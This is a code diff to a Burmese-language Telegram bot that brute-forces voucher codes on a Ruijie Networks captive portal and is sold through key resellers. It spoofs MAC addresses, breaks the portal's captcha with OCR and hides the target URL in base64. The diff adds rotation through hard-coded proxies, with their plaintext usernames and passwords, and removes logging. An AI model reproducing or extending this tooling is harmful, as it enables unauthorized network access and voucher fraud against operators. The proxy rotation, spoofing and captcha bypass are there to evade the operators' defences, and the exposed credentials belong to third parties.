@@ -14,6 +14,26 @@ AUTH_FILE = "auth_list.json"     # Key စာရင်း
 RESULT_FILE = "result.json"      # Success Code စာရင်း
 SELLERS_FILE = "sellers.json"    # Seller စာရင်း
 ADMIN_CONTACT = "@mrtantawmoe"       # Admin ဆက်သွယ်ရန် Username
+
+# ------------------------- PROXIES ------------------------
+RAW_PROXIES = [
+    "31.59.20.176:6754:ejzmwgnm:ns6t3k305e72",
+    "45.38.107.97:6014:ejzmwgnm:ns6t3k305e72",
+    "198.105.121.200:6462:ejzmwgnm:ns6t3k305e72",
+    "64.137.96.74:6641:ejzmwgnm:ns6t3k305e72",
+    "198.23.243.226:6361:ejzmwgnm:ns6t3k305e72",
+    "38.154.185.97:6370:ejzmwgnm:ns6t3k305e72",
+    "84.247.60.125:6095:ejzmwgnm:ns6t3k305e72",
+    "142.111.67.146:5611:ejzmwgnm:ns6t3k305e72",
+    "191.96.254.138:6185:ejzmwgnm:ns6t3k305e72",
+    "31.58.9.4:6077:ejzmwgnm:ns6t3k305e72"
+]
+
+def get_random_proxy():
+    p = random.choice(RAW_PROXIES)
+    ip, port, user, pwd = p.split(":")
+    proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
+    return proxy_url
 # ---------------------------------------------------------
 
 bot = AsyncTeleBot(BOT_TOKEN)
@@ -202,7 +222,7 @@ async def help_command(message):
         "  `/delkey <user_id>` – Key ဖျက်ရန်\n"
         "  `/listkeys` – မှတ်ပုံတင်ထားသော Key စာရင်းကို ကြည့်ရန်\n"
         "  `/status` – Bot အခြေအနေကို ကြည့်ရန်\n\n"
-        "🔹 **Admin Only** (အဓိက Admin မှသာ):\n"
+        "🔹 **Admin Only** (အဓိក Admin မှသာ):\n"
         "  `/addseller <user_id> <plan>` – Seller အဖြစ် ထည့်သွင်းရန်\n"
         "  `/removeseller <user_id>` – Seller ကို ဖယ်ရှားရန်\n"
         "  `/listsellers` – Seller စာရင်းနှင့် ကျန်အချိန်ကို ကြည့်ရန်\n"
@@ -478,15 +498,11 @@ async def save_rechecked_codes(chat_id_str, recheck_list):
     result[chat_id_str] = recheck_list
     await save_result()
 
-# ---------- Improved Session URL Check with Logs ----------
+# ---------- Improved Session URL Check ----------
 async def check_session_url(session_url):
     parsed = urlparse(session_url)
     query_params = parse_qs(parsed.query)
-    print(f"[check_session_url] Checking URL: {session_url}")
-    print(f"[check_session_url] Query params found: {query_params}")
-    
     if 'sessionId' in query_params and query_params['sessionId'][0]:
-        print("[check_session_url] sessionId found directly in URL query.")
         return True
 
     headers = {
@@ -502,19 +518,16 @@ async def check_session_url(session_url):
         'sec-fetch-site': 'same-origin',
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%80%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
+        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
     }
     try:
-        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
+        proxy = get_random_proxy()
+        async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy) as response:
             final_url = str(response.url)
-            print(f"[check_session_url] Response status: {response.status}")
-            print(f"[check_session_url] Final redirected URL: {final_url}")
             if "sessionId" in final_url:
                 return True
-            print("[check_session_url] sessionId NOT found in final URL.")
             return False
-    except Exception as e:
-        print(f"[check_session_url] Request Exception: {e}")
+    except:
         return False
 
 @bot.message_handler(commands=['input'])
@@ -612,6 +625,7 @@ async def check_code_status(session_url, code):
         b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
     ).decode()
 
+    proxy = get_random_proxy()
     for _attempt in range(2):
         timeout = aiohttp.ClientTimeout(total=20)
         async with aiohttp.ClientSession(
@@ -620,17 +634,17 @@ async def check_code_status(session_url, code):
             cookie_jar=aiohttp.CookieJar(),
             timeout=timeout
         ) as task_session:
-            session_id = await get_session_id(task_session, session_url, None)
+            session_id = await get_session_id(task_session, session_url, None, proxy=proxy)
             if not session_id:
                 return "invalid"
             auth_code = None
             for _ in range(5):
                 try:
-                    image = await Captcha_Image(task_session, session_id)
+                    image = await Captcha_Image(task_session, session_id, proxy=proxy)
                     text = await Captcha_Text(image)
                     if not text:
                         continue
-                    verified = await Varify_Captcha(task_session, session_id, text)
+                    verified = await Varify_Captcha(task_session, session_id, text, proxy=proxy)
                     if verified:
                         auth_code = text
                         break
@@ -661,7 +675,7 @@ async def check_code_status(session_url, code):
                 "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
             }
             try:
-                async with task_session.post(post_url, json=data, headers=headers) as req:
+                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy) as req:
                     response = await req.text()
                     if 'logonUrl' in response:
                         return "success"
@@ -932,7 +946,7 @@ def get_mac():
     mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
     return ':'.join(f'{x:02x}' for x in mac)
 
-async def get_session_id(session, session_url, previous_session_id=None):
+async def get_session_id(session, session_url, previous_session_id=None, proxy=None):
     mac = get_mac()
     session_url = replace_mac(session_url, new_mac=mac)
     headers = {
@@ -948,10 +962,10 @@ async def get_session_id(session, session_url, previous_session_id=None):
         'sec-fetch-site': 'same-origin',
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%80%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
+        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
     }
     try:
-        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
+        async with session.get(session_url, headers=headers, allow_redirects=True, proxy=proxy) as req:
             response = str(req.url)
             session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
             if session_id:
@@ -977,6 +991,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
 
     response = None
     resp_json = None
+    proxy = get_random_proxy()
 
     for attempt in range(2):
         timeout = aiohttp.ClientTimeout(total=25)
@@ -986,7 +1001,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             cookie_jar=aiohttp.CookieJar(),
             timeout=timeout
         ) as task_session:
-            session_id = await get_session_id(task_session, session_url, None)
+            session_id = await get_session_id(task_session, session_url, None, proxy=proxy)
             if not session_id:
                 retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
                 return
@@ -994,11 +1009,11 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             auth_code = None
             for _ in range(8):
                 try:
-                    image = await Captcha_Image(task_session, session_id)
+                    image = await Captcha_Image(task_session, session_id, proxy=proxy)
                     text = await Captcha_Text(image)
                     if not text:
                         continue
-                    verified = await Varify_Captcha(task_session, session_id, text)
+                    verified = await Varify_Captcha(task_session, session_id, text, proxy=proxy)
                     if verified:
                         auth_code = text
                         break
@@ -1035,7 +1050,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
             }
             try:
-                async with task_session.post(post_url, json=data, headers=headers) as req:
+                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy) as req:
                     response = await req.text()
                     resp_json = json.loads(response)
                     print(f"[voucher] code={code} attempt={attempt+1} status={req.status} resp={resp_json}")
@@ -1116,28 +1131,24 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             except Exception as e:
                 print(f"Limited Message Error: {e}")
 
-# ----------------- OCR FUNCTION -----------------
+_ocr = ddddocr.DdddOcr(show_ad=False)
+
 def _ocr_sync(image_bytes):
-    try:
-        ocr_engine = ddddocr.DdddOcr(show_ad=False)
-        nparr = np.frombuffer(image_bytes, np.uint8)
-        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-        if img is None:
-            return None
-        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-        blur = cv2.GaussianBlur(gray, (3, 3), 0)
-        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-        _, buffer = cv2.imencode('.png', thresh)
-        result = ocr_engine.classification(buffer.tobytes())
-        return result.upper()
-    except Exception as e:
-        print(f"[OCR Error]: {e}")
+    nparr = np.frombuffer(image_bytes, np.uint8)
+    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+    if img is None:
         return None
+    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+    blur = cv2.GaussianBlur(gray, (3, 3), 0)
+    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+    _, buffer = cv2.imencode('.png', thresh)
+    result = _ocr.classification(buffer.tobytes())
+    return result.upper()
 
 async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
 
-async def Captcha_Image(session, session_id):
+async def Captcha_Image(session, session_id, proxy=None):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
@@ -1155,10 +1166,10 @@ async def Captcha_Image(session, session_id):
         'sessionId': session_id,
         '_t': str(time.time()),
     }
-    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
+    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=proxy) as req:
         return await req.read()
 
-async def Varify_Captcha(session, session_id, text):
+async def Varify_Captcha(session, session_id, text, proxy=None):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'accept': '*/*',
@@ -1178,7 +1189,7 @@ async def Varify_Captcha(session, session_id, text):
         'sessionId': session_id,
         'authCode': text,
     }
-    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
+    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, proxy=proxy) as req:
         data = await req.json()
         print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
         if data.get("success") == True:
